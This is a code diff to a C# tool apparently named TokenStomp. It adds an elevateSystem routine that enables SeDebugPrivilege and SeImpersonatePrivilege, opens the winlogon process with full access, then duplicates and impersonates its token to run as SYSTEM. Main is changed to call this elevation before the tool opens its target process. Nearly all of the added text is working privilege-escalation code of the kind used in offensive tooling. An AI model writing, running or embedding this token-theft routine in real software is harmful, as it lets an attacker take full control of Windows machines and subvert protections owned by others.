@@ -158,6 +158,143 @@ namespace TokenStomp
             out int ReturnLength
         );
 
+        private enum ProcessAccessTypes
+        {
+            PROCESS_TERMINATE = 0x00000001,
+            PROCESS_CREATE_THREAD = 0x00000002,
+            PROCESS_SET_SESSIONID = 0x00000004,
+            PROCESS_VM_OPERATION = 0x00000008,
+            PROCESS_VM_READ = 0x00000010,
+            PROCESS_VM_WRITE = 0x00000020,
+            PROCESS_DUP_HANDLE = 0x00000040,
+            PROCESS_CREATE_PROCESS = 0x00000080,
+            PROCESS_SET_QUOTA = 0x00000100,
+            PROCESS_SET_INFORMATION = 0x00000200,
+            PROCESS_QUERY_INFORMATION = 0x00000400,
+            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
+            SYNCHRONIZE = 0x00100000,
+            PROCESS_ALL_ACCESS = PROCESS_TERMINATE | PROCESS_CREATE_THREAD | PROCESS_SET_SESSIONID | PROCESS_VM_OPERATION |
+              PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_DUP_HANDLE | PROCESS_CREATE_PROCESS | PROCESS_SET_QUOTA |
+              PROCESS_SET_INFORMATION | PROCESS_QUERY_INFORMATION | STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr GetCurrentProcess();
+
+        [DllImport("advapi32.dll")]
+        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName,out LUID lpLuid);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, UInt32 BufferLengthInBytes,ref TOKEN_PRIVILEGES PreviousState,out UInt32 ReturnLengthInBytes);
+        [DllImport("kernel32.dll")]
+        static extern uint GetLastError();
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SECURITY_ATTRIBUTES
+        {
+            public int nLength;
+            public IntPtr lpSecurityDescriptor;
+            public int bInheritHandle;
+        }
+        public enum TOKEN_TYPE
+        {
+            TokenPrimary = 1,
+            TokenImpersonation
+        }
+        public enum SECURITY_IMPERSONATION_LEVEL
+        {
+            SecurityAnonymous,
+            SecurityIdentification,
+            SecurityImpersonation,
+            SecurityDelegation
+        }
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public extern static bool DuplicateTokenEx(IntPtr hExistingToken,uint dwDesiredAccess,ref SECURITY_ATTRIBUTES lpTokenAttributes,SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,TOKEN_TYPE TokenType,out IntPtr phNewToken);
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
+
+
+        public static bool enablePrivilege(IntPtr tokenHandle, String privilegeName)
+        {
+            LUID luid;
+            if (!LookupPrivilegeValue(null, privilegeName, out luid))
+            {
+                Console.WriteLine("[!] LookupPrivilegeValue Error");
+                return false;
+            }
+            var tokenPriv = new TOKEN_PRIVILEGES
+            {
+                PrivilegeCount = 1,
+                Privileges = new LUID_AND_ATTRIBUTES[1]
+            };
+            tokenPriv.Privileges[0].Luid = luid;
+            tokenPriv.Privileges[0].Attributes = 0x00000002; // SE_PRIVILEGE_ENABLED
+            tokenPriv.PrivilegeCount = 1;
+            tokenPriv.Privileges[0].Luid = luid;
+            if (!AdjustTokenPrivileges(tokenHandle, false, ref tokenPriv, 0, IntPtr.Zero, IntPtr.Zero))
+            {
+                Console.WriteLine("[!] AdjustTokenPrivileges Error");
+                return false;
+            }
+            if (GetLastError() == 1300) // ERROR_NOT_ALL_ASSIGNED 
+            {
+                Console.WriteLine("[!] The token does not have the specified privilege");
+                return false;
+            }
+            return true;
+        }
+
+        public static bool elevateSystem()
+        {
+            bool result;
+            IntPtr getCurrentToken;
+            Process[] processes = Process.GetProcessesByName("winlogon");
+
+            if (processes.Length < 1)
+            {
+                Console.WriteLine("[!] Winlogon process is not found for elevation");
+                return false;
+            }
+            result = OpenProcessToken(GetCurrentProcess(), TokenAccessFlags.TOKEN_ADJUST_PRIVILEGES, out getCurrentToken);
+            if (!result)
+            {
+                Console.WriteLine("[!] Couldn't open the current process token");
+                return false;
+            }
+
+            if (!enablePrivilege(getCurrentToken, "SeDebugPrivilege") && !enablePrivilege(getCurrentToken, "SeImpersonatePrivilege"))
+            {
+                Console.WriteLine("[!] SetPrivilege() Enable Error");
+                return false;
+            }
+            int pidToImpersonate = processes[0].Id;
+            IntPtr processHandle = OpenProcess(ProcessAccessFlags.All, true, pidToImpersonate);
+            IntPtr tokenHandle, duplicateTokenHandle;
+            SECURITY_IMPERSONATION_LEVEL seimp = SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation;
+            TOKEN_TYPE tk = TOKEN_TYPE.TokenPrimary;
+            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
+            if (processHandle == IntPtr.Zero)
+            {
+                Console.WriteLine("[!] OpenProcess Error");
+                return false;
+            }
+            if (!OpenProcessToken(processHandle, TokenAccessFlags.TOKEN_DUPLICATE | TokenAccessFlags.TOKEN_QUERY | TokenAccessFlags.TOKEN_IMPERSONATE, out tokenHandle))
+            {
+                Console.WriteLine("[!] OpenProcessToken error");
+                return false;
+            }
+            if (!DuplicateTokenEx(tokenHandle, 0x008 | 0x002 | 0x004, ref sa, seimp, tk, out duplicateTokenHandle))
+            {
+                Console.WriteLine("[!] DuplicateTokenEx error");
+                return false;
+            }
+            if (!ImpersonateLoggedOnUser(duplicateTokenHandle))
+            {
+                Console.WriteLine("[!] ImpersonateLoggedOnUser error");
+                return false;
+            }
+            return true;
+        }
 
         public static void Main(string[] args)
         {
@@ -194,6 +331,11 @@ namespace TokenStomp
 
             Console.WriteLine("[*] Found {0} with pid {1}", currentProcess.ProcessName, currentProcess.Id);
             int pid = currentProcess.Id;
+
+            if (!elevateSystem())
+            {
+                Console.WriteLine("[!] Cannot elevate to SYSTEM. Tool may not work properly if you are running this from an admin console.");
+            }
 
             IntPtr handle = OpenProcess(ProcessAccessFlags.QueryLimitedInformation, false, pid);
 
